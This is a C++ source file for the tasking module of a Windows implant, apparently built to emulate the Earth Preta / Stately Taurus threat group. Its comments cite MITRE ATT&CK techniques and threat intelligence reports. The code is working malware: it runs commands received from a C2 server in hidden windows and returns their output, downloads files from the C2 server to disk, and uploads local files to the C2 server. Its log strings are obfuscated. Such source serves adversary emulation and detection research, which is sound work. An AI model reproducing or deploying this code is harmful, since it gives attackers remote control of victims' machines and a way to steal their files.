#include "exec.hpp"
#include "shellcode_util.hpp"

#define WAIT_CHUNK_MS 100

/*
 * CreateTaskProcess:
 *      About:
 *          Create a process using the given command line, using the CreateProcessW API call.
 *      Result:
 *          Returns true on success, false otherwise.
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 */
BOOL CreateTaskProcess(sh_context* ctx, LPWSTR command_line, HANDLE h_output_pipe, PROCESS_INFORMATION* process_info) {
    STARTUPINFOW startup_info; // specify how to start process
    pi_memset(&startup_info, 0, sizeof(startup_info));
    startup_info.cb = sizeof(startup_info);
    startup_info.dwFlags |= STARTF_USESTDHANDLES;
    startup_info.hStdOutput = h_output_pipe;
    startup_info.hStdError = h_output_pipe;

    return ctx->fp.fp_CreateProcessW(
        NULL, // module name included in command line
        command_line,
        NULL,
        NULL,
        TRUE, // inherit our output pipe handle
        CREATE_NO_WINDOW, // dwCreationFlags
        NULL, // use environment of calling process
        NULL, // use current dir of calling process
        &startup_info,
        process_info
    );
}

/*
 * GetProcessOutputAndCleanupTaskProcess:
 *      About:
 *          Gets process output and sends output to C2 server,
 *          waits for process to finish or timeout, and closes
 *          process handles.
 *      Result:
 *          Returns 0 on success, otherwise some error code
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 */
DWORD GetProcessOutputAndCleanupTaskProcess(
    sh_context* ctx,
    client_message* msg_buf,
    server_response* resp_buf,
    HANDLE h_pipe_rd,
    PROCESS_INFORMATION* process_info,
    task_command_data* task_data,
    DWORD* exit_code
) {
    BOOL result;
    DWORD num_bytes_read = 0;
    DWORD total_bytes_read = 0;
    DWORD error;

    size_t total_time_waited = 0;
    DWORD wait_limit_ms = task_data->timeout * 1000;
    BOOL finished = FALSE;
    DWORD error_code = ERROR_SUCCESS;
    task_output_data* p_output_chunk_data = reinterpret_cast<task_output_data*>(&(msg_buf->data));

    do {
        DWORD size = 0;

        DWORD wait_result = ctx->fp.fp_WaitForSingleObject(process_info->hProcess, WAIT_CHUNK_MS);
        total_time_waited += WAIT_CHUNK_MS;

        if (wait_result == WAIT_OBJECT_0) {
            // Process finished. Grab exit code
            finished = TRUE;
            if (!ctx->fp.fp_GetExitCodeProcess(process_info->hProcess, exit_code)) {
                error_code = ctx->fp.shared_fp.fp_GetLastError();
                AesLogger::LogError(&(ctx->log_ctx), "Failed to get process exit code. Error code: %d"_xor, error_code);
            } else {
                AesLogger::LogDebug(&(ctx->log_ctx), "Process finished with exit code: %d"_xor, *exit_code);
            }
        } else if (wait_result == WAIT_FAILED) {
            error_code = ctx->fp.shared_fp.fp_GetLastError();
            AesLogger::LogError(&(ctx->log_ctx), "Failed to wait for process. Error code: %d"_xor, error_code);
            break;
        }

        // Process either finished or this current wait round elapsed.
        // Read some output and send to C2 server
        while(TRUE) {
            DWORD available = 0;

            // check if we have data available in the pipe
            if (!ctx->fp.fp_PeekNamedPipe(h_pipe_rd, NULL, 0, NULL, &available, NULL)) {
                break;
            }
            if (!available) {
                break;
            }
            num_bytes_read = 0;
            result = ctx->fp.fp_ReadFile(
                h_pipe_rd,
                p_output_chunk_data->output_chunk,
                sizeof(p_output_chunk_data->output_chunk),
                &num_bytes_read,
                NULL
            );

            total_bytes_read += num_bytes_read;
            if (num_bytes_read > 0) {
                // Set this each time so it doesn't get overwritten when message buffer is encrypted
                p_output_chunk_data->task_num = task_data->task_num;
                AesLogger::LogDebug(&(ctx->log_ctx), "Sending chunk for task num: %d"_xor, p_output_chunk_data->task_num);

                // Send output chunk to c2 server
                p_output_chunk_data->chunk_size = num_bytes_read;
                AesLogger::LogDebug(&(ctx->log_ctx), "Sending %d bytes of output to C2 server"_xor, num_bytes_read);
                error_code = SendTaskOutput(ctx, msg_buf, resp_buf, p_output_chunk_data);
                if (error_code != ERROR_SUCCESS) {
                    break;
                }
            }
            if (!result) {
                error = ctx->fp.shared_fp.fp_GetLastError();
                if (error == ERROR_BROKEN_PIPE) {
                    // End of pipe. Normal flow.
                    break;
                } else if (error != ERROR_MORE_DATA) {
                    finished = TRUE;
                    error_code = error;

                    AesLogger::LogError(&(ctx->log_ctx), "Failed to read from output pipe. Error code: %d"_xor, error_code);
                    break;
                }
            }
        }

        if (total_time_waited >= wait_limit_ms) {
            AesLogger::LogWarn(&(ctx->log_ctx), "Process timed out."_xor);
            error_code = FAIL_TASK_TIMEOUT_REACHED;
            finished = TRUE;
        }
    } while (!finished);
    ctx->fp.shared_fp.fp_CloseHandle(process_info->hProcess);
    ctx->fp.shared_fp.fp_CloseHandle(process_info->hThread);

    AesLogger::LogDebug(&(ctx->log_ctx), "Received %d total output bytes from process."_xor, total_bytes_read);
    return error_code;
}

/*
 * PerformExecTask:
 *      About:
 *          Performs process execution task and sends output to C2 server.
 *          Will also send task completion notification or error notification
 *          depending on the task result.
 *          Process is executed using the CreateProcessW API call.
 *      Result:
 *          Returns 0 on success, otherwise some error code
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html
 */
DWORD PerformExecTask(sh_context* ctx, client_message* msg_buf, server_response* resp_buf, task_command_data* task_data) {
    // Ensure command string is null-terminated
    task_data->command[task_data->command_len > MAX_CMD_LEN ? MAX_CMD_LEN : task_data->command_len] = '\0';

    AesLogger::LogDebug(&(ctx->log_ctx), "Executing task number %d"_xor, task_data->task_num);
    AesLogger::LogDebug(&(ctx->log_ctx), "Executing command: %s"_xor, task_data->command);

    DWORD result;
    DWORD exit_code = 0;

    // Widen command string
    pi_widen_str(task_data->command, task_data->command_len, ctx->command_buf, MAX_CMD_LEN + 1);

    // Create named pipe to retrieve output
    HANDLE h_pipe_output_rd = NULL;
    HANDLE h_pipe_output_wr = NULL;
    do {
        // Allow our pipe handle to be inherited and set lax security attributes
        SECURITY_ATTRIBUTES pipe_sa;
        pipe_sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        pipe_sa.bInheritHandle = TRUE;
        pipe_sa.lpSecurityDescriptor = NULL;

        if (!ctx->fp.fp_CreatePipe(&h_pipe_output_rd, &h_pipe_output_wr, &pipe_sa, 0)) {
            result = ctx->fp.shared_fp.fp_GetLastError();
            AesLogger::LogError(&(ctx->log_ctx), "Failed to create pipe for process stdout. Error code: %d"_xor, result);
            break;
        }

        // Set pipe handle
        if (!ctx->fp.fp_SetHandleInformation(h_pipe_output_rd, HANDLE_FLAG_INHERIT, 0)) {
            result = ctx->fp.shared_fp.fp_GetLastError();
            AesLogger::LogError(&(ctx->log_ctx), "Failed to set handle for stdout pipe. Error code: %d"_xor, result);
            break;
        }

        // Create process, output to pipe we created
        AesLogger::LogDebug(&(ctx->log_ctx), "Creating process."_xor);
        PROCESS_INFORMATION process_info; // for created process
        if (!CreateTaskProcess(ctx, ctx->command_buf, h_pipe_output_wr, &process_info)) {
            result = ctx->fp.shared_fp.fp_GetLastError();
            AesLogger::LogError(&(ctx->log_ctx), "Failed to create process. Error code: %d"_xor, result);
            break;
        }

        AesLogger::LogInfo(
            &(ctx->log_ctx),
            "Created process with ID %d"_xor,
            process_info.dwProcessId
        );

        // Get process output and wait for it to finish
        result = GetProcessOutputAndCleanupTaskProcess(ctx, msg_buf, resp_buf, h_pipe_output_rd, &process_info, task_data, &exit_code);
    } while (false);

    if (h_pipe_output_wr != NULL) {
        ctx->fp.shared_fp.fp_CloseHandle(h_pipe_output_wr);
    }

    if (h_pipe_output_rd != NULL) {
        ctx->fp.shared_fp.fp_CloseHandle(h_pipe_output_rd);
    }

    // Notify task complete or task error
    if (result == ERROR_SUCCESS) {
        task_complete_data data;
        data.task_num = task_data->task_num;
        data.task_type = RESP_TYPE_EXEC_CMD;
        data.exit_code = exit_code;
        return NotifyTaskComplete(ctx, msg_buf, &data);
    } else {
        return NotifyTaskError(ctx, msg_buf, task_data->task_num, result);
    }
}

/*
 * PerformFileDownloadTask:
 *      About:
 *          Downloads file from C2 server and writes it to disk.
 *      Result:
 *          Returns 0 on success, otherwise some error code
 *      MITRE ATT&CK Techniques:
 *          T1105: Ingress Tool Transfer
 *          T1106: Native API
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html
 *          https://unit42.paloaltonetworks.com/stately-taurus-attacks-se-asian-government/
 *          https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html
 */
DWORD PerformFileDownloadTask(sh_context* ctx, client_message* msg_buf, server_response* resp_buf) {
    DWORD result = ERROR_SUCCESS;

    // server response buf contains task data upon function entry
    task_start_download_data* task_data = reinterpret_cast<task_start_download_data*>(resp_buf->data);

    // Ensure dest path string is null-terminated
    task_data->dest_path[task_data->dest_path_len >= MAX_PATH ? MAX_PATH - 1 : task_data->dest_path_len] = '\0';

    AesLogger::LogDebug(&(ctx->log_ctx), "Executing task number %d"_xor, task_data->task_num);
    AesLogger::LogDebug(&(ctx->log_ctx), "Downloading file to: %s"_xor, task_data->dest_path);

    // Recycle ctx->command_buf for the string manipulation buffer to widen the path
    pi_widen_str(task_data->dest_path, task_data->dest_path_len, ctx->command_buf, MAX_PATH);
    DWORD task_num = task_data->task_num;

    // Open handle to destination file
    HANDLE h_dest = ctx->fp.shared_fp.fp_CreateFileW(
        ctx->command_buf,
        GENERIC_READ | GENERIC_WRITE,
        0, // no sharing while file is being created
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (h_dest == INVALID_HANDLE_VALUE) {
        result = ctx->fp.shared_fp.fp_GetLastError();
        AesLogger::LogError(&(ctx->log_ctx), "Failed to open handle to destination file. Error code: %d"_xor, result);
        NotifyTaskError(ctx, msg_buf, task_num, result);
        return result;
    }

    // task_data pointer will no longer contain valid data since resp_buf will be overwritten
    task_data = NULL;

    // Request file chunks until server sends back < MSG_DATA_MAX_LEN bytes
    USHORT recv_chunk_size = MSG_DATA_MAX_LEN;
    size_t curr_offset = 0;
    do {
        // Set up file chunk request
        file_chunk_req* req = reinterpret_cast<file_chunk_req*>(msg_buf->data);
        req->offset = curr_offset;
        req->task_num = task_num;
        req->chunk_max_size = MSG_DATA_MAX_LEN;

        // Verify server response
        result = RequestFileChunk(ctx, msg_buf, resp_buf, req);
        if (result != ERROR_SUCCESS) {
            AesLogger::LogError(&(ctx->log_ctx), "Failed to receive file chunk from server at offset %d. Error code: %d"_xor, curr_offset, result);
            break;
        } else if (resp_buf->resp_type != RESP_TYPE_FILE_CHUNK) {
            result = FAIL_BAD_SERVER_RESP_TYPE;
            AesLogger::LogError(&(ctx->log_ctx), "Expected server response to be file chunk type, received: %d"_xor, resp_buf->resp_type);
            break;
        }

        // Write file chunk to disk
        recv_chunk_size = PAYLOAD_SIZE(resp_buf) - sizeof(resp_buf->resp_type);
        AesLogger::LogDebug(&(ctx->log_ctx), "Received %d bytes from offset %d."_xor, recv_chunk_size, curr_offset);
        if (recv_chunk_size > 0) {
            result = WriteFileBytes(
                &(ctx->fp.shared_fp),
                h_dest,
                reinterpret_cast<char*>(resp_buf->data),
                recv_chunk_size
            );
            if (result != ERROR_SUCCESS) {
                AesLogger::LogError(&(ctx->log_ctx), "Failed to write file chunk at offset %d. Error code: %d"_xor, curr_offset, result);
                break;
            }
            AesLogger::LogDebug(&(ctx->log_ctx), "Wrote %d bytes to file."_xor, recv_chunk_size);
        }
        curr_offset += recv_chunk_size;
    } while(recv_chunk_size >= MSG_DATA_MAX_LEN);

    if (h_dest != NULL && h_dest != INVALID_HANDLE_VALUE) {
        ctx->fp.shared_fp.fp_CloseHandle(h_dest);
    }

    // Send success or error notification
    if (result != ERROR_SUCCESS) {
        NotifyTaskError(ctx, msg_buf, task_num, result);
    } else {
        task_complete_data data;
        data.task_num = task_num;
        data.task_type = RESP_TYPE_FILE_DOWNLOAD;
        data.exit_code = 0;
        NotifyTaskComplete(ctx, msg_buf, &data);
    }
    return result;
}

/*
 * PerformFileUploadTask:
 *      About:
 *          Uploads the specified file on disk to the C2 server
 *      Result:
 *          Returns 0 on success, otherwise some error code
 *      MITRE ATT&CK Techniques:
 *          T1041: Exfiltration Over C2 Channel
 *          T1106: Native API
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html
 *          https://unit42.paloaltonetworks.com/stately-taurus-attacks-se-asian-government/
 */
DWORD PerformFileUploadTask(sh_context* ctx, client_message* msg_buf, server_response* resp_buf, task_start_upload_data* task_data) {
    DWORD result = ERROR_SUCCESS;

    // Ensure dest path string is null-terminated
    task_data->src_path[task_data->src_path_len >= MAX_PATH ? MAX_PATH - 1 : task_data->src_path_len] = '\0';

    AesLogger::LogDebug(&(ctx->log_ctx), "Executing task number %d"_xor, task_data->task_num);
    AesLogger::LogDebug(&(ctx->log_ctx), "Uploading file to C2 server: %s"_xor, task_data->src_path);

    // Recycle ctx->command_buf for the string manipulation buffer to widen the path
    pi_widen_str(task_data->src_path, task_data->src_path_len, ctx->command_buf, MAX_PATH);
    DWORD task_num = task_data->task_num;

    // Open handle to source file
    HANDLE h_src = ctx->fp.shared_fp.fp_CreateFileW(
        ctx->command_buf,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (h_src == INVALID_HANDLE_VALUE) {
        result = ctx->fp.shared_fp.fp_GetLastError();
        if (result == ERROR_FILE_NOT_FOUND) {
            AesLogger::LogError(&(ctx->log_ctx), "Source file %s does not exist."_xor, task_data->src_path);
        } else {
            AesLogger::LogError(&(ctx->log_ctx), "Failed to open source file. Error code: %d"_xor, result);
        }
        NotifyTaskError(ctx, msg_buf, task_num, result);
        return result;
    }

    // Send file chunks until we reach end of file
    DWORD bytes_read = 0;
    BOOL read_result;
    task_output_data* output_data = reinterpret_cast<task_output_data*>(msg_buf->data);

    do {
        read_result = ctx->fp.fp_ReadFile(
            h_src,
            output_data->output_chunk,
            sizeof(output_data->output_chunk),
            &bytes_read,
            NULL
        );
        if (!read_result) {
            result = ctx->fp.shared_fp.fp_GetLastError();
            AesLogger::LogError(&(ctx->log_ctx), "Failed to read source file. Error code: %d"_xor, result);
            break;
        } else if (bytes_read > 0) {
            AesLogger::LogDebug(&(ctx->log_ctx), "Read %d bytes from file - sending to C2 server."_xor, bytes_read);

            // Send file chunk to c2 server
            output_data->task_num = task_num;
            output_data->chunk_size = bytes_read;
            result = SendTaskOutput(ctx, msg_buf, resp_buf, output_data);
            if (result != ERROR_SUCCESS) {
                break;
            }
        }
    } while(bytes_read > 0);

    if (h_src != NULL && h_src != INVALID_HANDLE_VALUE) {
        ctx->fp.shared_fp.fp_CloseHandle(h_src);
    }

    // Send success or error notification
    if (result != ERROR_SUCCESS) {
        NotifyTaskError(ctx, msg_buf, task_num, result);
    } else {
        task_complete_data data;
        data.task_num = task_num;
        data.task_type = RESP_TYPE_FILE_UPLOAD;
        data.exit_code = 0;
        NotifyTaskComplete(ctx, msg_buf, &data);
    }
    return result;
}
